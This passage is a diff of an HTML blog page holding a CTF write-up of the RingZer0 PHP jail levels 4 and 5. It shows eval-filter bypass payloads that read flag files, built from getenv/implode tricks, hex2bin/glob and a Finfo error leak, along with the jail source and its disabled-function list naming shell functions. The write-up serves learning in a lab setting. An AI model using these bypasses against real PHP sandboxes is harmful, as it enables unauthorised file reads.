+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HEY - assumed <span style="color:#ed9d13">&#39;HEY&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+<span style="color:#6ab825;font-weight:bold">Array</span>
 (
-    [<span style=color:#3677a9>0</span>] =&gt; 
-    [<span style=color:#3677a9>1</span>] =&gt; home
-    [<span style=color:#3677a9>2</span>] =&gt; level4
-    [<span style=color:#3677a9>3</span>] =&gt; jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>d code
+    [<span style="color:#3677a9">0</span>] =&gt; 
+    [<span style="color:#3677a9">1</span>] =&gt; home
+    [<span style="color:#3677a9">2</span>] =&gt; level4
+    [<span style="color:#3677a9">3</span>] =&gt; jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>d code
 )
-</code></pre></div><p>By using <code>implode()</code> you can then concatenate several characters:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>print_r(implode(getenv(HOME)[<span style=color:#3677a9>0</span>],[getenv(HOME)[<span style=color:#3677a9>0</span>],home,level4,file]));
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant home - assumed <span style=color:#ed9d13>&#39;home&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant level4 - assumed &#39;</span>level4<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant file - assumed <span style=color:#ed9d13>&#39;file&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#a61717;background-color:#e3d2d2>&#39;</span>d code on line <span style=color:#3677a9>1</span>
-<span style=color:#999;font-style:italic>//home/level4/fileCommand executed
-</span></code></pre></div><p>d) Now if you put a), b) and c) together you should be able to build your payload:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>define(HEY, <span style=color:#40ffff>__FILE__</span>); highlight_file(implode(getenv(HOME)[<span style=color:#3677a9>0</span>],[getenv(HOME)[<span style=color:#3677a9>0</span>],home,level4,getenv(HOME)[<span style=color:#3677a9>0</span>],implode(explode(getenv(HOME)[<span style=color:#3677a9>0</span>],HEY)[<span style=color:#3677a9>0</span>], [fl,explode(getenv(HOME)[<span style=color:#3677a9>0</span>],HEY)[<span style=color:#3677a9>3</span>][<span style=color:#3677a9>1</span>],g,explode(getenv(HOME)[<span style=color:#3677a9>0</span>],HEY)[<span style=color:#3677a9>3</span>][<span style=color:#3677a9>4</span>],t,x,t])])); 
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HEY - assumed <span style=color:#ed9d13>&#39;HEY&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant home - assumed &#39;</span>home<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant level4 - assumed <span style=color:#ed9d13>&#39;level4&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant fl - assumed &#39;</span>fl<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant g - assumed &#39;</span>g<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant HOME - assumed <span style=color:#ed9d13>&#39;HOME&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant t - assumed &#39;</span>t<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-PHP Notice:  <span style=color:#6ab825;font-weight:700>Use</span> of undefined constant x - assumed <span style=color:#ed9d13>&#39;x&#39;</span> in /home/level4/jail.php(<span style=color:#3677a9>14</span>) : <span style=color:#6ab825;font-weight:700>eval</span>()<span style=color:#ed9d13>&#39;d code on line 1
-</span><span style=color:#ed9d13>PHP Notice:  Use of undefined constant t - assumed &#39;</span>t<span style=color:#ed9d13>&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style=color:#3677a9>1</span>
-&lt;code&gt;&lt;span style=<span style=color:#ed9d13>&#34;color: #000000&#34;</span>&gt;
+</code></pre></div><p>By using <code>implode()</code> you can then concatenate several characters:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">print_r(implode(getenv(HOME)[<span style="color:#3677a9">0</span>],[getenv(HOME)[<span style="color:#3677a9">0</span>],home,level4,file]));
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant home - assumed <span style="color:#ed9d13">&#39;home&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant level4 - assumed &#39;</span>level4<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant file - assumed <span style="color:#ed9d13">&#39;file&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>d code on line <span style="color:#3677a9">1</span>
+<span style="color:#999;font-style:italic">//home/level4/fileCommand executed
+</span></code></pre></div><p>d) Now if you put a), b) and c) together you should be able to build your payload:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">define(HEY, <span style="color:#40ffff">__FILE__</span>); highlight_file(implode(getenv(HOME)[<span style="color:#3677a9">0</span>],[getenv(HOME)[<span style="color:#3677a9">0</span>],home,level4,getenv(HOME)[<span style="color:#3677a9">0</span>],implode(explode(getenv(HOME)[<span style="color:#3677a9">0</span>],HEY)[<span style="color:#3677a9">0</span>], [fl,explode(getenv(HOME)[<span style="color:#3677a9">0</span>],HEY)[<span style="color:#3677a9">3</span>][<span style="color:#3677a9">1</span>],g,explode(getenv(HOME)[<span style="color:#3677a9">0</span>],HEY)[<span style="color:#3677a9">3</span>][<span style="color:#3677a9">4</span>],t,x,t])])); 
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HEY - assumed <span style="color:#ed9d13">&#39;HEY&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant home - assumed &#39;</span>home<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant level4 - assumed <span style="color:#ed9d13">&#39;level4&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant HOME - assumed &#39;</span>HOME<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant fl - assumed &#39;</span>fl<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant g - assumed &#39;</span>g<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant HOME - assumed <span style="color:#ed9d13">&#39;HOME&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant t - assumed &#39;</span>t<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+PHP Notice:  <span style="color:#6ab825;font-weight:bold">Use</span> of undefined constant x - assumed <span style="color:#ed9d13">&#39;x&#39;</span> in /home/level4/jail.php(<span style="color:#3677a9">14</span>) : <span style="color:#6ab825;font-weight:bold">eval</span>()<span style="color:#ed9d13">&#39;d code on line 1
+</span><span style="color:#ed9d13">PHP Notice:  Use of undefined constant t - assumed &#39;</span>t<span style="color:#ed9d13">&#39; in /home/level4/jail.php(14) : eval()&#39;</span>d code on line <span style="color:#3677a9">1</span>
+&lt;code&gt;&lt;span style=<span style="color:#ed9d13">&#34;color: #000000&#34;</span>&gt;
 FLAG-X9uF51b0X570f616897kLN3It3K6m63c&lt;br /&gt;&lt;/span&gt;
 &lt;/code&gt;Command executed
-</code></pre></div><p>I know&mldr; Very complicated (I&rsquo;ve seen solutions using <code>hex2bin()</code>) but it does its job :)</p><h1 id=level-5>Level 5</h1><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>RingZer0 Team Online CTF
+</code></pre></div><p>I know&hellip; Very complicated (I&rsquo;ve seen solutions using <code>hex2bin()</code>) but it does its job :)</p>
+<h1 id="level-5">Level 5</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">RingZer0 Team Online CTF
 
-PHP Jail Level <span style=color:#3677a9>5</span>:
-Current user is uid=<span style=color:#3677a9>1004</span>(level5) gid=<span style=color:#3677a9>1004</span>(level5) groups=<span style=color:#3677a9>1004</span>(level5)
+PHP Jail Level <span style="color:#3677a9">5</span>:
+Current user is uid=<span style="color:#3677a9">1004</span>(level5) gid=<span style="color:#3677a9">1004</span>(level5) groups=<span style="color:#3677a9">1004</span>(level5)
 
 Flag is located at /home/level5/flag.txt
 
@@ -214,46 +317,145 @@ Challenge PHP code:
 -----------------------------
 
 WARNING: the PHP interpreter is launched using php -c php.ini jail.php.
-The php.ini file contain <span style=color:#ed9d13>&#34;disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file&#34;</span>
+The php.ini file contain <span style="color:#ed9d13">&#34;disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file&#34;</span>
 
 &lt;?php
-array_shift(<span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
-<span style=color:#40ffff>$var</span> = implode(<span style=color:#ed9d13>&#34; &#34;</span>, <span style=color:#40ffff>$_SERVER</span>[<span style=color:#ed9d13>&#39;argv&#39;</span>]);
+array_shift(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
+<span style="color:#40ffff">$var</span> = implode(<span style="color:#ed9d13">&#34; &#34;</span>, <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;argv&#39;</span>]);
 
-<span style=color:#6ab825;font-weight:700>if</span>(<span style=color:#40ffff>$var</span> == <span style=color:#6ab825;font-weight:700>null</span>) <span style=color:#6ab825;font-weight:700>die</span>(<span style=color:#ed9d13>&#34;PHP Jail need an argument</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>);
+<span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$var</span> == <span style="color:#6ab825;font-weight:bold">null</span>) <span style="color:#6ab825;font-weight:bold">die</span>(<span style="color:#ed9d13">&#34;PHP Jail need an argument</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 
-<span style=color:#6ab825;font-weight:700>function</span> <span style=color:#447fcf>filter</span>(<span style=color:#40ffff>$var</span>) {
-        <span style=color:#6ab825;font-weight:700>if</span>(preg_match(<span style=color:#ed9d13>&#39;/(\_|\&#39;|\&#34;|`|\.|\$|\/|a|c|s|z|require|include)/i&#39;</span>, <span style=color:#40ffff>$var</span>)) {
-                <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>false</span>;
+<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">filter</span>(<span style="color:#40ffff">$var</span>) {
+        <span style="color:#6ab825;font-weight:bold">if</span>(preg_match(<span style="color:#ed9d13">&#39;/(\_|\&#39;|\&#34;|`|\.|\$|\/|a|c|s|z|require|include)/i&#39;</span>, <span style="color:#40ffff">$var</span>)) {
+                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
         }
-        <span style=color:#6ab825;font-weight:700>return</span> <span style=color:#6ab825;font-weight:700>true</span>;
+        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
 }
-<span style=color:#6ab825;font-weight:700>if</span>(filter(<span style=color:#40ffff>$var</span>)) {
-        <span style=color:#6ab825;font-weight:700>eval</span>(<span style=color:#40ffff>$var</span>);
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Command executed&#34;</span>;
-} <span style=color:#6ab825;font-weight:700>else</span> {
-        <span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;Restricted characters has been used&#34;</span>;
+<span style="color:#6ab825;font-weight:bold">if</span>(filter(<span style="color:#40ffff">$var</span>)) {
+        <span style="color:#6ab825;font-weight:bold">eval</span>(<span style="color:#40ffff">$var</span>);
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Command executed&#34;</span>;
+} <span style="color:#6ab825;font-weight:bold">else</span> {
+        <span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;Restricted characters has been used&#34;</span>;
 }
-<span style=color:#6ab825;font-weight:700>echo</span> <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>;
-<span style=color:#cd2828;font-weight:700>?&gt;</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>
-</span><span style=color:#a61717;background-color:#e3d2d2>-----------------------------
-</span><span style=color:#a61717;background-color:#e3d2d2>Your input:
-</span></code></pre></div><p>The first thing I did was to generate the filename (<code>flag.txt</code>):</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.php data-lang=.php>Your input:
-<span style=color:#6ab825;font-weight:700>print</span>(glob(hex2bin(hex2bin(<span style=color:#3677a9>3261</span>)))[<span style=color:#3677a9>0</span>]);
+<span style="color:#6ab825;font-weight:bold">echo</span> <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>;
+<span style="color:#cd2828;font-weight:bold">?&gt;</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">
+</span><span style="color:#a61717;background-color:#e3d2d2">-----------------------------
+</span><span style="color:#a61717;background-color:#e3d2d2">Your input:
+</span></code></pre></div><p>The first thing I did was to generate the filename (<code>flag.txt</code>):</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.php" data-lang=".php">Your input:
+<span style="color:#6ab825;font-weight:bold">print</span>(glob(hex2bin(hex2bin(<span style="color:#3677a9">3261</span>)))[<span style="color:#3677a9">0</span>]);
 flag.txtCommand executed
 Your input:
 </code></pre></div><p>Then I needed some function to read the contents from <code>flag.txt</code>. However, due to additional character restrictions, I wasn&rsquo;t able to find
-any one that would bypass the restrictions. Then I bought the hint which stated:</p><blockquote><p>md5 can return raw characters such as *, Some classes can help you error messages too</p></blockquote><p>So I need some class with some <strong>constructor</strong> which takes a filename as an argument. As always: Google is your friend ->
-<code>inurl:php.net/manual/en/class</code>. And then I&rsquo;ve found <a href=http://php.net/manual/en/class.finfo.php>Finfo</a>:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Your input:
+any one that would bypass the restrictions. Then I bought the hint which stated:</p>
+<blockquote>
+<p>md5 can return raw characters such as *, Some classes can help you error messages too</p>
+</blockquote>
+<p>So I need some class with some <strong>constructor</strong> which takes a filename as an argument. As always: Google is your friend -&gt;
+<code>inurl:php.net/manual/en/class</code>. And then I&rsquo;ve found <a href="http://php.net/manual/en/class.finfo.php">Finfo</a>:</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Your input:
 new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
 PHP Notice:  finfo::finfo(): Warning: offset `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ&#39; invalid in /home/level5/jail.php(14) : eval()&#39;d code on line 1
 PHP Notice:  finfo::finfo(): Warning: type `FLAG-81M2544kLM9nxBJCfMG2ET8329Lo1qqZ&#39; invalid in /home/level5/jail.php(14) : eval()&#39;d code on line 1
 PHP Warning:  finfo::finfo(): Failed to load magic database at &#39;/home/level5/flag.txt&#39;. in /home/level5/jail.php(14) : eval()&#39;d code on line 1
 Command executed
-</code></pre></div></div></main><div class="tl fixed list-pages lh-copy" id=contents-list></div><div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l"><a id=scroll-to-top class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick=topFunction() style="color:#fff;visibility:hidden;display:none;transition:opacity .5s,visibility .5s" title="back to top">back to top</a><br><p class="mb0 mt2"><a href=http://blog.dornea.nu/2016/06/16/distribute-your-backups-using-git-annex/>prev post</a>
-<a href=http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/>next post</a></p></div><footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l"><hr class="dn db-l ml0-l gray w3"><br>Powered by <a href=https://gohugo.io/ target=_blank class="link gray dim">Hugo</a>, based on the <a href=https://github.com/lingxz/er target=_blank class="link gray dim">Er</a> theme.<br></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js></script><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css><style>.is-active-link::before{background-color:var(--secondary-color)}</style><script type=text/javascript>var prevScrollpos=window.pageYOffset;window.onscroll=function(){var currentScrollPos=window.pageYOffset;if(document.getElementById("tag-cloud")!==null){if(prevScrollpos>currentScrollPos){document.getElementById("tag-cloud").style.visibility="visible";document.getElementById("tag-cloud").style.opacity="1";}else{document.getElementById("tag-cloud").style.visibility="hidden";document.getElementById("tag-cloud").style.opacity="0";}}
-if(document.body.scrollTop>1000||document.documentElement.scrollTop>1000){document.getElementById("scroll-to-top").style.display="inline";document.getElementById("scroll-to-top").style.visibility="visible";document.getElementById("scroll-to-top").style.opacity="1";}else{document.getElementById("scroll-to-top").style.visibility="hidden";document.getElementById("scroll-to-top").style.opacity="0";}
-prevScrollpos=currentScrollPos;}
-function topFunction(){document.body.scrollTop=0;document.documentElement.scrollTop=0;}
-if(document.getElementById("contents-list")!==null&&document.getElementsByClassName("post-content").length!==0){tocbot.init({tocSelector:'#contents-list',contentSelector:'.post-content',headingSelector:'h1, h2, h3',});}</script></body></html>
+</code></pre></div></div>
+</main>
+ 
+
+
+
+
+
+
+<div class="tl fixed list-pages lh-copy" id="contents-list"></div>
+
+
+
+<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
+  
+<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
+<br>
+  <p class="mb0 mt2">
+  <a href="http://blog.dornea.nu/2016/06/16/distribute-your-backups-using-git-annex/">prev post</a>
+  <a href="http://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-bash/">next post</a>
+  </p>
+</div>
+
+  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
+  <hr class="dn db-l ml0-l gray w3"><br>
+  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme. <br>
+  
+</footer>
+  
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<style>.is-active-link::before { background-color: var(--secondary-color); }</style>
+
+
+
+
+<script type="text/javascript">
+var prevScrollpos = window.pageYOffset;
+window.onscroll = function() {
+  var currentScrollPos = window.pageYOffset;
+
+  
+  if (document.getElementById("tag-cloud") !== null) { 
+    if (prevScrollpos > currentScrollPos) { 
+      document.getElementById("tag-cloud").style.visibility = "visible";
+      document.getElementById("tag-cloud").style.opacity = "1";
+    } else {
+      document.getElementById("tag-cloud").style.visibility = "hidden";
+      document.getElementById("tag-cloud").style.opacity = "0";
+    }
+  }
+  
+
+  
+  if (document.body.scrollTop > 1000 || document.documentElement.scrollTop > 1000) {
+      document.getElementById("scroll-to-top").style.display = "inline";
+      document.getElementById("scroll-to-top").style.visibility = "visible";
+      document.getElementById("scroll-to-top").style.opacity = "1";
+  } else {
+      document.getElementById("scroll-to-top").style.visibility = "hidden";
+      document.getElementById("scroll-to-top").style.opacity = "0";
+  }
+  
+  prevScrollpos = currentScrollPos;
+}
+
+
+function topFunction() {
+  document.body.scrollTop = 0; 
+  document.documentElement.scrollTop = 0; 
+}
+
+
+
+
+
+
+if (document.getElementById("contents-list") !== null && document.getElementsByClassName("post-content").length !== 0) { 
+  tocbot.init({
+    
+    tocSelector: '#contents-list',
+    
+    contentSelector: '.post-content',
+    
+    headingSelector: 'h1, h2, h3',
+  });
+}
+
+
+</script>
+
+
+
+
+</body>
+</html>
